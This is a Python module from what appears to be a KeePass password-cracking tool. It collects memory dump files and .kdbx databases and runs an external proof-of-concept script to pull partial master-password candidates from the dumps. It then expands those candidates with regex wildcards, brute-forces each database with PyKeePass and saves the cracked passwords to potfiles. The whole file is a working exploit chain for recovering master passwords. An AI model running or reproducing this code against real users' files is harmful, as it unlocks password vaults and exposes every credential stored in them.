import os
import re
import subprocess
from typing import Dict, List, Tuple, Union

from pykeepass import PyKeePass, exceptions
from logger import log_msg
import exrex


def get_or_create_folders() -> Tuple[str, ...]:
    """
    Ensures the existence of specific directories and returns their paths.

    This function retrieves the current working directory and defines paths for several directories.
    If any of the specified directories do not exist, they are created automatically.
    If required library directories do not exist, an exception is raised.

    Raises:
        FileNotFoundError: If a required directory (e.g., keepass-dump-masterkey) is not found.

    Returns:
        tuple[str, ...]: A tuple containing the paths to the directories.
    """
    log_msg("Getting the list of necessary directories locations...")
    # Get the current working directory (where the main script is executed from)
    main_script_dir = os.getcwd()
    # Define the paths to the libraries and resources directories.
    possible_pwds_dir = os.path.join(main_script_dir, "possible-pwds")
    generated_pwds_dir = os.path.join(main_script_dir, "generated-pwds")
    keepass_dump_masterkey_dir = os.path.join(main_script_dir, "keepass-dump-masterkey")

    if not os.path.exists(keepass_dump_masterkey_dir):
        log_msg(f"Please make sure keepass-dump-masterkey is installed in {keepass_dump_masterkey_dir}", "WARNING")
        raise FileNotFoundError(f"Required directory not found: {keepass_dump_masterkey_dir}")

    # Check if the directory exists, if not, create it
    if not os.path.exists(possible_pwds_dir):
        os.makedirs(possible_pwds_dir)
    if not os.path.exists(generated_pwds_dir):
        os.makedirs(generated_pwds_dir)

    return possible_pwds_dir, generated_pwds_dir, keepass_dump_masterkey_dir


def collect_dumps(dir: str) -> Tuple[List[str], List[str]]:
    """
    Collects and returns lists of specific file types from a directory.

    This function scans the specified directory and identifies files with specific extensions:
    - Files ending with ".DMP" are added to the dump_files list.
    - Files ending with ".kdbx" are added to the keepass_files list.

    If the directory contains non-file entries (e.g., subdirectories), they are skipped.

    Args:
        dir (str): The directory to scan for files.

    Returns:
        Tuple[List[str], List[str]]: A tuple containing:
            - dump_files: A list of file paths for files ending with ".DMP".
            - keepass_files: A list of file paths for files ending with ".kdbx".

    """
    log_msg(f"Collecting .DMP and .kdbx files from {dir}...")
    dir_list: List[str] = os.listdir(dir)  # We can safely assume str is the return type
    dump_files = []
    keepass_files = []

    for f in dir_list:
        file_path = os.path.join(dir, f)

        # Skip non-file entries like directories
        if not os.path.isfile(file_path):
            continue

        # Add .DMP files to dump_files list
        if f.lower().endswith(".dmp"):
            dump_files.append(file_path)

        # Add .kdbx files to keepass_files list
        if f.lower().endswith(".kdbx"):
            keepass_files.append(file_path)
    log_msg(f"Collected {len(dump_files)} .DMP files.")
    log_msg(f"Collected {len(keepass_files)} .kdbx files.")
    return dump_files, keepass_files


def collect_possible_pwds(dump_files: List[str], keepass_dumper_dir: str, possible_pwds_dir: str) -> List[str]:
    """
    Processes a list of dump files to extract possible passwords and saves them in text files.

    For each file in the provided list of dump files, this function:
    - Checks if the corresponding possible password file already exists in the target directory.
    - If it exists, the file is added to the list of possible password files.
    - If it does not exist, the function runs a subprocess to extract passwords and creates a new password file.

    Args:
        dump_files (list[str]): A list of dump file paths to process.
        keepass_dumper_dir (str): The directory where the password extraction tool is located.
        possible_pwds_dir (str): The directory where possible password files should be saved.

    Returns:
        list[str]: A list of paths to the possible password files.

    """
    log_msg("Collecting possible passwords from .DMP files...")
    possible_pwds_files = []

    for f in dump_files:

        # Get the base file name without extension from an absolute or relative path
        file_name_without_ext = os.path.splitext(os.path.basename(f))[0]
        possible_pwd_file = os.path.join(possible_pwds_dir, f"{file_name_without_ext}.txt")

        if os.path.isfile(possible_pwd_file):
            log_msg(f"Passwords file already exists for {f}: {possible_pwd_file}. Skipping...", "DEBUG")
            possible_pwds_files.append(possible_pwd_file)
            continue

        log_msg(f"Getting possible passwords from {file_name_without_ext} DMP file...")

        run_subprocess(
            ["python", "poc.py", f"{f}", "-o", f"{possible_pwd_file}"],
            cwd=keepass_dumper_dir,
            encoding="utf-8",
            check=True,
        )

        log_msg(f"Possible passwords saved in {possible_pwd_file} file...", "DEBUG")
        possible_pwds_files.append(possible_pwd_file)

    return possible_pwds_files


def generate_pwds(possible_pwds_files: List[str], generated_pwds_dir: str) -> List[str]:
    """
    Generates password permutations from a list of possible passwords and saves them to text files.

    This function reads possible password files, generates permutations for each password using regex patterns,
    and writes the generated passwords to new files in the specified directory. If the generated file already exists,
    the function skips generating it again.

    Args:
        possible_pwds_files (list[str]): A list of file paths containing possible passwords.
        generated_pwds_dir (str): The directory where generated password files will be saved.

    Returns:
        list[str]: A list of file paths for the generated password files.
    """
    log_msg("Generating passwords...")
    generated_pwd_files = []

    for f in possible_pwds_files:
        file_name_without_ext = os.path.splitext(os.path.basename(f))[0]
        generated_pwd_file = os.path.join(generated_pwds_dir, f"{file_name_without_ext}.txt")

        # Skip if the generated password file already exists
        if os.path.isfile(generated_pwd_file):
            log_msg(f"Passwords file already exists for {f}: {generated_pwd_file}. Skipping...", "DEBUG")
            generated_pwd_files.append(generated_pwd_file)
            continue

        with open(f, "r", encoding="utf-8") as file:
            possible_passwords = file.read().splitlines()
        log_msg(f"Read {len(possible_passwords)} possible passwords from {f} file.", "DEBUG")

        generated_passwords = []

        for pwd in possible_passwords:
            pwd = re.escape(pwd)
            # Replace specific characters with wildcards (can generalize if needed)
            pwd = pwd.replace("●", ".").replace("", ".")

            # Generate permutations using exrex and collect them
            pwds = list(exrex.generate(pwd))
            generated_passwords.extend(pwds)
        log_msg(f"Generated {len(generated_passwords)} passwords from {f} file.", "DEBUG")

        # Write generated passwords to a file, one password per line
        with open(generated_pwd_file, "w", encoding="utf-8") as file:
            file.writelines(f"{password}\n" for password in generated_passwords)
        log_msg(f"Wrote {len(generated_passwords)} passwords to {generated_pwd_file} file.", "DEBUG")
        generated_pwd_files.append(generated_pwd_file)

    return generated_pwd_files


def brute_force(generated_pwds_files: List[str], keepass_files: List[str]) -> List[Dict[str, str]]:
    """
    Attempts to brute-force KeePass files using a list of generated passwords.

    This function takes in two lists: one containing file paths to generated password lists and another containing
    file paths to KeePass files. For each KeePass file, it attempts to open the file using each password in the
    corresponding generated password list. If a password successfully unlocks the KeePass file, it is stored and the
    brute-force process for that file halts.

    Args:
        generated_pwds_files (List[str]): A list of file paths containing generated passwords, one per line.
        keepass_files (List[str]): A list of file paths to KeePass databases (.kdbx files).

    Returns:
        List[Dict[str, str]]: A list of dictionaries, each containing the KeePass file name (without extension) and
        the cracked password.
    """
    cracks = []  # Store cracked KeePass file info
    passwords = {}  # Store passwords from files

    # Read password files and store them in a dictionary
    for pwd_file in generated_pwds_files:
        file_name_without_ext = os.path.splitext(os.path.basename(pwd_file))[0]
        try:
            with open(pwd_file, "r", encoding="utf-8") as file:
                passwords[file_name_without_ext] = file.read().splitlines()
        except FileNotFoundError as e:
            log_msg(f"Password file {pwd_file} not found: {e}", "ERROR")
            continue  # Log error and skip to the next file

    # Attempt to crack each KeePass file
    for kp_file in keepass_files:
        log_msg(f"Exploiting {kp_file}")
        file_name_without_ext = os.path.splitext(os.path.basename(kp_file))[0]

        if file_name_without_ext not in passwords:
            log_msg(f"No matching passwords file found for {kp_file}", "ERROR")
            continue  # Log error and skip to the next KeePass file

        # Try each password for the current KeePass file
        for pwd in passwords[file_name_without_ext]:
            try:
                PyKeePass(kp_file, password=pwd)  # Attempt to open KeePass file
                log_msg(f"Cracked {kp_file}: {pwd}")
                cracks.append({"keepass_file": file_name_without_ext, "keepass_password": pwd})
                break  # Stop brute-forcing this file once cracked
            except exceptions.CredentialsError:
                continue  # Invalid password.
            except Exception as e:
                log_msg(f"Failed attempt with password '{pwd}' for {kp_file}: {e}", "DEBUG")
                continue

    return cracks


def generate_pot_file(exploit_results: List[Dict[str, str]], output_dir: str) -> List[str]:
    """
    Generates .potfile files for each cracked KeePass file.

    This function takes a list of exploitation results and an output directory, then generates a .potfile for each
    cracked KeePass file. The .potfile contains the KeePass file name and the associated cracked password.

    Args:
        exploit_results (List[Dict[str, str]]): A list of dictionaries, each containing the keys 'keepass_file' and
        'keepass_password', which represent the cracked KeePass file and its password.
        output_dir (str): The directory where the .potfiles will be saved.

    Returns:
        List[str]: A list of file paths to the generated .potfiles.

    Notes:
        Each .potfile is named after the KeePass file (without extension) and stored in the output directory. The
        contents of the file will be in the format: <keepass_file>:<keepass_password>.
    """
    pot_files = []

    # Ensure the output directory exists
    os.makedirs(output_dir, exist_ok=True)

    # Generate a .potfile for each exploit result
    for exploit in exploit_results:
        try:
            # Extract KeePass file name without extension
            file_name_without_ext = os.path.splitext(os.path.basename(exploit["keepass_file"]))[0]
            pot_file = os.path.join(output_dir, f"{file_name_without_ext}.potfile")

            # Write the cracked password to the .potfile
            with open(pot_file, "w", encoding="utf-8") as file:
                file.write(f"{exploit['keepass_file']}:{exploit['keepass_password']}")
                pot_files.append(pot_file)

            log_msg(f"Generated potfile: {pot_file}")

        except KeyError as e:
            log_msg(f"Missing key in exploit result: {e}", "ERROR")
        except OSError as e:
            log_msg(f"Error writing to file {pot_file}: {e}", "ERROR")

    return pot_files


def run_subprocess(
    args: Union[str, bytes, os.PathLike],
    on_error_message: str = None,
    shell: bool = False,
    cwd: str = None,
    encoding: str = None,
    timeout: float = None,
    check: bool = False,  # Adds a check parameter to raise an exception if returncode is non-zero
    input: str = None,  # Adds input parameter to pass data to stdin,
) -> subprocess.CompletedProcess[str]:
    """
    Wrapper function that calls subprocess.run with given arguments.

    Args:
        args (tuple) : Arguments to pass to subprocess.run.
        on_error_message (str) : Custom error message to log when subprocess fails.
        shell (bool) : Sets the shell flag of subprocess.run.
        cwd (str): The directory from which to run the command. Defaults to None.
        encoding (str): Specifies encoding for the output.
        timeout (float): Specifies timeout for subprocess.run.
        check (bool): If True, raise a CalledProcessError on non-zero exit code.
        input (str): Data to send to the subprocess' stdin.

    Raises:
        RuntimeError: When subprocess.run returns a non-zero exit code and check is False.
        subprocess.CalledProcessError: If check is True and a non-zero exit code occurs.

    Returns:
        subprocess.CompletedProcess[str] : Result of subprocess.run.
    """

    if shell:
        log_msg(f"Potential security risk: args {args} is running in shell!", "WARNING")

    # Copy the existing environment and set PYTHONIOENCODING to utf-8
    env = os.environ.copy()
    env["PYTHONIOENCODING"] = "utf-8"

    try:
        # Pass the input argument if specified
        result = subprocess.run(
            args,
            capture_output=True,  # Capture stdout and stderr
            text=True,  # Treat stdout, stderr, and input as text (str)
            shell=shell,  # Run in shell if needed
            cwd=cwd,  # Working directory
            encoding=encoding,  # Encoding for input and output
            timeout=timeout,  # Timeout for the process
            input=input,  # Input data for stdin
            check=check,  # Raise error if command fails (non-zero exit code)
            env=env,
        )
        return result

    except subprocess.TimeoutExpired as e:
        raise RuntimeError(f"Subprocess timed out: {e}")

    except subprocess.CalledProcessError as e:
        if not on_error_message:
            on_error_message = str(args)
        raise RuntimeError(f"{on_error_message}: {e.stderr.strip()}")

    except Exception as e:
        raise RuntimeError(f"An unexpected error occurred: {str(e)}")
